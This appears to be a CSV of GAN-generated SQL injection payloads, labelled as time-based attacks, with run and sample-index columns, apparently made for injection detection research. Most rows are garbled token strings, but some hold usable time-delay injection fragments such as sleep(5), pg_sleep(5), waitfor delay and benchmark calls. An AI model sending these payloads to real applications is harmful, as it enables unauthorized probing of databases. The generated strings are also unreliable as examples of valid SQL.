label,payload,family,payload_type,method,run_id,sample_index
attack," if if   =   not  =    =  ""   )    )    or sleep  (  __TIME__  )    =  "" 8140 where delay waitfor sleep delay or 8  =  =  5   )    )    acnoocs  f delay (;  "" like ""m elt or  n    ( sleep '0:0:2' Eh7260 5702 from delay c  =    select not not  (  (  =     f  f delay '0:0:2' from  from delay benchmark      ,  (  T,Mmdnwaitfor ellt  (  =  1  6784  =  (  ),--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,316
attack,",""  =  ""    ('||  (  select 'phdix 0  select ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,317
attack,"1%'||  (  select 'ua""  =  """"    or and --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,318
attack,"1""   )    )    as @t    =  select 2388 waitfor not  (  =   )    ) '0:0:__TIME__'waitfor 4287 or if waitfor delay '0:0:__TIME__' from delay pg_sleep  (  0x6d457153 and ; and (  = ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,319
attack,' orsleep  (  1361 ( --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,320
attack,"1"" 6866 1361 benchmark  =  (  select and delay and    ( benchmark  select --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,321
attack,"1"" > benchmark  <>  (  )    or --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,322
attack,1%'   )    --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,323
attack,"1""   )    )    or delay from from ( sleep  benchmark  (,md5  )  ,sleep  (  5   )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,324
attack,"1   )    s; if  not  (  s where not  =    'isintegratedsecurityonly' '0:0:2' delay 6784 not(  (  benchmark  (  __TIME  (  10000000,md5  (substring   (  5873   (  sleep  (  5  'isintegratedsecurityonly'  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,325
attack,1tect,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,326
attack,"1""  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,327
attack,"; if from not  )   (  =  sleepe  (    ,sleep  (  =    (    (  0x6d457153     where  =    8781 where waitfor sleep        =  sleep  (  =  select from  = if  delay '0:0:2' not  =  u =% where el delay '0:0:2' delay 3114(  )  sleep  =  u from delay or '0:0:__TIME__',sleep  (     )    )     and pg_sleep  (  (  sleep  (  sleep  (  (  (  substring   6866 from like 3824  (    (  =  '0:0:2' y  ,",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,328
attack,"1"" where e,  (  3114 delay if '0:0:__TIME__'waitfor from 2657  (  6272  = delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,329
attack,"""  1   )    aba where @ where 25 not  from when 3885 delay delay waitfor not  (  3114 not  =  9862 8781 '0:0:__TIME__'=  (  = waitfor '0:0:2' from not  (  )  ) 3824 if 2388  =    e pg_sleep  =  (  =    )    )    or delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,330
attack,""" or sleep  (  __TIME__  )    =  ""1""  8  )    swaitforshvene,waitforl  6784 , ) 0  (  select '0:0:2' delay delay ),--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,331
attack,1   )    )   <>i sleep  =  (    (  =  1 or '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,332
attack,"""    )    or frome       ( benchmark  (  )    )    or 4240 delay '0:0:__TIME__'benchmark  (  5MD5  (    ,25,mi  n1  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,333
attack,""" or sleep  (  __TIME__  )    =  "" '0:0:2' from from sleep  (  substring  5  )    )    or 8514  (  =    (  )   delay or sleep  (  sleep  (  5   )    )    )s   hvqedn  )  )",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,334
attack,    (  )    aspcuadwaitfor delay 8140 '0:0:2' not  =    (  (  select information_schemaet  =  5  )    or --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,335
attack,1lopor delay and ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,336
attack,"j2657 not  (  ,       (  'isintegratedsecurityonly' not  =   )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,337
attack,"""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""o where delay '0:0:__TIME__'waitfor  and not delay   ( --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,338
attack,"1""   )    )    and p 8514  =  =  substring waitfor and '0:0:10'  sleep  = --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,339
attack,"1%'    ,mdole25p* if waitfor delay and like -- v I and * from from sleep  (  5   )    )    select notm elt  (  )     delay ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,340
attack,") where not  =  "" waitfor i from  (  7260 delay 5466 delay not  sleep delay '0:0:2'  1361 delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,341
attack,"1"" where  =  benchmark  )   )    or waitfor  =  =  6456 '0:0:2' if not * from,md dcy  (  'sysadmin'   )    )    <>  7629 from not  (  # p  where from if =  =  6866 from 7629  (  5702 delay  =     deie  )  )   <> sihpbdt:"" d1 ps 7739 '0:0:2' and . 'sa' '0:0:2' delay where 8781  =  =  '0:0:__TIME__'----",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,342
attack,""" and from @vet  7629 if .et * if 4240 e and where if sleep  =  1361 n  (  ,         where waitfor delay 0 '0:0:__TIME__' '0:0:2' * delay '0:0:__TIME__'(   '0:0:2' 7260 from  '0:0:2' from 1361  = s not  =   not  9443    1361=  6456 not  (  =  )    or * 8781 2657 '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,343
attack,if if * em not  6456  =  =  6784 from from 8514 =  (5  )    accneo     not  (   @5  (  5   )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,344
attack,1   )    )   > --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,345
attack,1%   )    <> or ( --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,346
attack,",1 9862 '0:0:2' --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,347
attack,1'||  (  select 'sM8781 ay' dt  (  )    asiohhthen delayaq delay 6784 delay '0:0:2' '0:0:__TIME__'--<> 2840 delay <> 5466 where  '0:0:2' delay 4240 8781 k where * delay delay or (  = 1  ' ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,348
attack,"1""   )    or --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,349
attack,"1   )    <> waitfor delay waitfor and not    =  sleep  (  6272 delay'0:0:__TIME__'=  IMeMDio dowaitfor delay delay  waitfor '0:0:__TIME__'2388  ,, delay where '0:0:10' or not  (  s 8781  (  select --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,350
attack,; delay and waitfor 4287  ( where where =  )    =  select  1  <> waitfor waitfor elt50  = from '0:0:2' or delay 1361=  =    select e not  (  3114  =  =    u benchmark  (  )    or --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,351
attack,"1%'||  (  select 'o waitfor where  =hc dt where 6456  =  1  ) from if where 8514  (  =  5466 not  =  (  benchmark    ,m not  (  )    )        waitfor '0:0:__TIME__' delay --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,352
attack,1' ; 7260 delay and or 5702 benchmark  (  5873   (  select delay '0:0:2' delay from 2388  =   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,353
attack,1%fffnot  or '0:0:__TIME__'    (  =  sleep  =  sleep  (   sleep  (  sleep  (  (  (  (    (    (  sleep1   (  selectelttd5  (  5873  )   2840 --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,354
attack,"1  )    <>a 5466  =  = (  )     8  )      waitfor acr and from   =  waitfor if not  (  )    =o not  (  5000000, 0  =  (   2657  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,355
attack,' waitfor and if delay delay delayT '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,356
attack,"""  waitfor  =  sleep  (  5000000 6784  from and or   if delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,357
attack,1    (  select  amd not  =  (  sleep  (  sleep  (  =  3114)   and pg_sleep  (  =    (  )    )    or --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,358
attack,1   )    asAcase 4287  7739 not  (  benchmark  (  5702waitfor delay --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,359
attack,"1""   )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,360
attack,"1""   )    )    or sleep  (  sleep  (    5le if where benchmark  (  5873 delay and not  (  = 1  sleep  (  3114  (  =  =  TIMDo,--y waitfor '0:0:2' 9443 not  =  (  (  IM --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,361
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""=  = where  waitfor wherev not    (  i from = waitfor 5466  = 9862 (  5e 8140  1361 where  2840 waitfor delay if from delay '0:0:2' waitfor delay '0:0:__TIME__'(  ( ,waitfor  5466 not delay and from pg_sleep  (  10000000,M=  8036      (  = as if 1361     7629 6969 delay 6456 delay delay  8781 not  2657  (  6784  sleep  =  ' @n  =   and * delay ) --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,362
attack,sleep  (  _  (    __=  =  ' '0:0:2' delay 9862  = '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,363
attack,1%'||  (  select 'siozfsio waitfor,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,364
attack,""" or sleep  (  __TIME__  )    =  """" where  '0:0:2' not  5  )s   8140  (  (  5000000 and waitfor from  7260  =  select 6969 2657 waitfor 0     =    select 6793 8514 --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,365
attack,"1"" 5466 and not  (  = benchmark  (  5000000,  "" like ""  )  or  ' --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,366
attack,",""   not  (  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,367
attack, 8466  (  (  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,368
attack,",10x76555642  waitfor if 4240 benchmark  (  case du not    ,Mr      )    )    or elt  =  3114 waitfor not  =   0x76555642  =  1   3885 delay and  n(  =selio not",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,369
attack,or sleep  (  5000000  sleep  7260  (  8140 and --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,370
attack,"baisinekwaitfor delay waitfor '0:0:2' '0:0:2' (  =  0x4c4d6142 delay)    waitfor delay pg_sleep  =  =     ) and if not  =  ,waitfor delay delay and 8514 or from    -- from delay from em  benchmark  ( 8781 benchmark  )  (  )   )    aselttihn  =  ,25  )  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,371
attack,"1'   )    )    rlike sleep  (  5  )   and    (    (   ',; where  =   8781 8140 not  =  8140  (  = delay not  (    s,ze where  (  select ,     =    1361 -- from from 6456  =  (  <> and waitfor delay sleep if elt 2840  7739 from =  =  =l where 2657  =  I delay '0:0:2'  6784 from delay 6969  =  (  h1 ua,1 24 el where 8781 from where delay and or delay or benchmark  (  (  )    )   <> ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,372
attack,"; 8466  ,  =  , delay from 25  )  =    )    as elt  =s n  (    =    )    )    x  'sa'=  = 9443enio ( elt  =  5  (  )    <> etsdy  )  ,waitfor 8  =  3885 6784  ( 1361=  =  0 p  =  )    (  )  f 8514 from not  (  5  s whereue"" or benchmark  (  5  or 4240  =  ( '0:0:10'8140  (  (  )    = (  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,373
attack,"1'  )    seand ifl where if pg_sleep  4287 waitfor from not delay delay and ellt  (  (  'isintegratedsecurityonly' -- ,m benchmark  =  (  ' '0:0:2' and delay not  =    =  ' '0:0:2' delay and  '0:0:2'  sleep  (  select  delay --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,374
attack,1'||  (  select 'a'0:0:2' x al where do waitfor from benchmark  (  )    )    kahwhere where  _  5702 delay '0:0:2' '0:0:2' --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,375
attack,"1'||  (  select '%%'   )    )    rlike sleep  (  5  )   and    (    (   'e'   )    )    rlike sleep  (  5  )   and    (    (   '""   )    )    or sleep  (  __TIME__  )    =  ""w sleeplt dio  =  )  =  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,376
attack,"1"" and and benchmark  sleep  (  _TIME__  (  _TIMDt__T    (  5   )    )    Dpo d elin  5  waitfor  (  )   or from   (  0x4c4d6142   select, '0:0:__TIME__' delayT    =  =  lT if  delay delay or delay from 4240 sleep  (  =   _TIMDmdmd5  )  ,1  <> and 8594 from     (  sleep  (  9443  0x6d457153   sleep  (  (  _TIME__TIME__  5000000",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,377
attack,"; and  delay '0:0:2' ( delay 6784    =  5466 elt '0:0:2' from 5466( am or 8036  =    =  ""  =  "" 4287 if not  =    (  'isintegratedsecurityonly' 9862 waitfor if where =  (  (  ""  )   rlike sleep  (  5  )   and   (  "" ellr  1  where if waitfor 6784=  =  (  select from delay from and waitfor not  =  _T7260t T_  =  =  3114 from delay  =     where delay (  (  =  =  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,378
attack,"""   )    )waitforwaitfor not  3114  =          =  =   '0:0:2' delay and from delay not  (  '  =  sleep  ) if 5466 delay '0:0:2' where waitfor delay '0:0:2' delay 7260  =  1361 sleep  =  =  6784 '0:0:2' where delay =  =i8781  8036 where 6784 delay delay sleep 6784   from from delay pg_sleep  =  =%   )    )    as alersierr =  (    )  )    waitfor<> 5466 '0:0:2' from waitfor delay  '0:0:2' 6969 '0:0:2'",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,379
attack,1M9  )    )    and' not from delay like not  (  )    =  )    2388  =le from delay if --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,380
attack,"5873,7260  =  benchmark delay waitfor delay '0:0:__TIME__', not  =, and from -- 8466  (  from not  (  select if pg_sleep  =s 2388  =  IMrserpsy  (  )    )    ahiits  (    sleep(    )     waitfor delay from (   not  =  4240 waitfor delay delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,381
attack,1 where  =  benchmark  (  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,382
attack,""" and   ,6866 --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,383
attack," --"" '0:0:__TIME__'waitfor sleep  =  (  ' where 9443 not * 9443 from 3824  ( from pg_sleep  (  10000000,my  (  10000000,m 8466 if not  =    e     from pg_sleep  (  =    (  select 6784 waitfor '0:0:2' and if delay  =  =  (  from -- )     from delay , delay waitfor and  3885 where --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,384
attack," desi(  )    )    and from delay from l7629 cihpko pg_sleep  8140  ( (  =  =  sleep  =  ,  =  ) -- delay '0:0:__TIME__'9443 delayhn  =  =ie uor k waitfor '0:0:2' delay 7260 '0:0:2' delay  = if not  =  elt   '0:0:__TIME__'",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,385
attack,"1""1   )    > and delay 2840 sleep waitfor where or * sleep  (  (  select --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,386
attack,"1   'isintegratedsecurityonly'""   waitfor or from sleep  _  (  (  _TIME__T_<em"" or sleep  (  __TIME__  )    =  ""  6272  1  )     not  (  = el delay  = 5702    pg_sleep from --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,387
attack,"1%""  )    or sleep  (  substring   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,388
attack,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""a' waitfor delay 'ecc50y  (  )    ase waitfor sleep     3885 and 4287 delay 4287 8781 '0:0:2' delay '0:0:__TIME__' '0:0:2'  (  = '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,389
attack,1  s * =  =  )    )    as where s delayuu l --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,390
attack,'   )    )    rlike sleep  (  5  )   and    (    (   ''  )  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,391
attack, delay and  * if --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,392
attack,  )   waitfor from pg_sleep  =      =  =  'isintegratedsecurityonly' not  (   6784  (  =     benchmark    )  )    and 7739 from  =  7260 =  =  ' '0:0:2' from delay delay --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,393
attack,1'||  (  select ''n) or or  =  select when  6784  4287  =l if ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,394
attack,"1%"" where delay 8036 waitfor from where '0:0:2' '0:0:__TIME__'  ,  4240 waitfor  =  7739 6784  =  =    = where  (  (  elelt  (  )  -- '0:0:2' ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,395
attack, where 2388=  (  )     el where delay not  4287 from delay 8781 =  (  (  = 3885 7739   not and 2388  (  = delay not  (  6784 delay and delay --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,396
attack,"1%"" 8781 delay where '0:0:__TIME__'if not  =  (  7260 sleep  5702 if 2657  6456 not  =  * 6456 delay '0:0:__TIME__'pg_sleep  ( not   8781 '0:0:2' '0:0:__TIME__'sleep  ((  =    (  (  select pg_sleep  (  5   )    )    or benchmark  (  (    ),sleep    (  5   )    )    asioo%i where where pg_sleep  (  =  ' delay (  select  from  er ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,397
attack,"1%%"" )    )    <>  )    a,waitfor =  ) waitfor from '0:0:2' delay --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,398
attack,"""I,n  )  =  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,399
attack,"1%""waitfor  and not  (  ),# ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,400
attack,   )    )    waitfor '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,401
attack,"1"" or --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,402
attack,"1 benchmark  (  3114  10000000,m )    waitfor '0:0:__TIME__'delay  '0:0:2' from 2388 --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,403
attack,"1'   )    alk if where  =  =  ' from or e 4240 '0:0:2' delay delay not  (  benchmark  (  substring   )         )    a"" waitfor  from * if 4240 ,sleep  =  9443 delay ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,404
attack,"1   )    ' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'    )    waitfor benchmark  )  (    )    as q elt  (  1361, if  '0:0:2' delay from 3885 delay  =l n  =  case '0:0:__TIME__'  3885  delay from from  benchmark  (  select  not  8781 delay 6793 8594 -- 4240 not  _ benchmark  (  select waitfor '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,405
attack,"' and   not  (  h, waitfor or '0:0:__TIME__',sleep  (  ;1 sleep g * sleep  (_TIME__TIME__TI,METselect",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,406
attack,; delay not  (  (   case and waitfor not  (  =  9443 not  select delay not  (  =  7739 i 8781 not  (  =    (  )    )    h6784  elt  3885 or delay  delay  not  =  sleep  (  =  ' 8594 from sleep  (  _    8140 from delay '0:0:2' or from or from sleep    =  (  5873  3114 (  )--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,407
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""cio,1 or pg_sleep  =  (  5 ellt if or d 4240 el  n '0:0:2' not  =  4287 e(  = 2388  delay waitfor from where e delay 8036  =  1361 if or 2388 delay n    =  5466  =  8036 % or from if where 7739 s 8140 waitfor 0 delay 6793  = not  = 2840 delay benchmark  (  'isintegratedsecurityonly' y    ,  if andsp not  (  )     )    a  waitfor from not delay 7260  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,408
attack,""" or delay2657 = 8140  (  = information_schemaelt  (  =' delay delay '0:0:2' from delay '0:0:__TIME__'waitfor delay '0:0:__TIME__'sleep  (  =  6272-- delay 4240 3885  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,409
attack,'  )   from delay and '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,410
attack,"1%""  )sq   o --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,411
attack,1 where s 6456  =      ( 4287  =    ( or 9862 --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,412
attack, if where1    =  1 waitfor delay or waitfor  or 4240 select 4287  =  1 25    =  8140 =  5702 where delay delay delay  '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,413
attack,"""  )    or delay (  (  I where and '0:0:2'l '0:0:2' delay '0:0:2' --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,414
attack,1 where 5466 elllrpelt  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,415
attack,1%' weo or from,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,416
attack,"2657   )    and; '0:0:__TIME__'    =  (  ""     1361  =  7629 waitfor pg_sleep  =  (  ,sy n delay delay delay not  = 7629 from if and from elt d5  = dpppo k 5702  (  =svem  s be t where 3885  =  ( or fromhwaitfor delay from 4240 noth , delay (  (  =  ' delay -- if waitfor '0:0:2' delay  (  =  4287  'sa' waitfor delay  8781 5702=  (  = ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,417
attack,1 waitfor delay '0:0:__TIME__'--'||  (  select ' --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,418
attack,"1%'||  (  select 'r%iaf""   )     aika""  =  "" if or elt  (  = 8036 6784  =  (  and delay waitfor  benchmark  (  ,waitfor '0:0:__TIME__'-- x from 0 p if not    =  =  1361  =   9862  = '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,419
